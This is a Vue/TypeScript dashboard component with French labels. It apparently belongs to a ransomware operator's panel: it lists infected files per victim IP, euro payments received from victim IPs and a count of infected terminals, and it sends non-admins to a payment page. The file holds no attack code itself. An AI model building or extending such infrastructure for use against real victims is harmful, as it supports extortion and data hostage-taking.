<template>

    <div class="layout_horizontal">
        <Header/>
        <div class="home">

            <p v-if="error">{{ error }}</p>

            <div v-else>
                <div class="grid">
                    <stat-card v-if="infectedFiles.length > 0">
                        <p v-for="log in infectedFiles" class="paragraphe">
<!--                            moment(log.createdAt).format("dd/mm/YYYY HH:mm a")-->
                            <span class="text-amber">{{ moment(log.createdAt).format("L HH:mm") }}</span>&nbsp;-&nbsp;
                            <span class="text-danger">{{ log.numberInfectedFile }}</span>&nbsp;fichiers&nbsp;infectés&nbsp;sur&nbsp;l'ip:&nbsp;
                            <span class="text-success">{{ log.ip }}</span>
                        </p>
                    </stat-card>
                    <stat-card v-if="payments.length > 0">
                        <p v-for="log in payments" class="paragraphe">
                            <span class="text-amber">{{ moment(log.createdAt).format("L HH:mm") }}</span>&nbsp;-&nbsp;
                            paiement de <span class="text-danger">{{ log.amount }}</span>&nbsp;€&nbsp;depuis&nbsp;l'ip:&nbsp;
                            <span class="text-success">{{ log.user.ip }}</span>
                        </p>
                    </stat-card>
                    <stat-card>
                        <p class="paragraphe">
                            <span class="text-amber">{{ moment(new Date()).format("L HH:mm") }}</span>&nbsp;-&nbsp;
                            <span class="text-danger">{{ infectedTerminals }}</span>&nbsp;terminaux&nbsp;infectés&nbsp;
                        </p>
                    </stat-card>
                </div>
            </div>

        </div>
    </div>

</template>

<script lang="ts">
import {defineComponent} from 'vue';
import Header from '../components/commons/Header.vue';
import HttpRequest from '../core/services/http/HttpRequest';
import {isAdmin, isLogged, isTokenExpired} from '../core/services/utils/auth';
import StatCard from "../components/stats/StatCard.vue";
import moment from 'moment'

export default defineComponent({
    name: 'Home',
    data() {
        return {
            error: null as string | null,
            token: isLogged(),
            infectedFiles: [],
            payments: [],
            infectedTerminals: 0,
            moment: moment
        }
    },
    components: {
        Header,
        StatCard
    },
    methods: {
        call(token: string | null): void {
            HttpRequest.get('/logs', token)
                .then((response: any) => {
                    this.payments = response.data.transactions
                    this.infectedFiles = response.data.logs
                    this.infectedTerminals = response.data.infectedTerminals
                    if([400, 404].includes(response.data.status_code)) {
                        this.$router.push('/*')
                    }
                })
                .catch((error: any) => {
                    this.error = error;
                });
        }
    },
    created() {

        if (this.token) {
            isTokenExpired(this.token);
            if(!isAdmin(this.token)) {
                this.$router.push('/payment');
            } else {
                this.call(this.token);
            }
        } else {
            this.$router.push('/login')
        }
    }
});
</script>

<style lang="scss" scoped>
// Your scoped scss
</style>
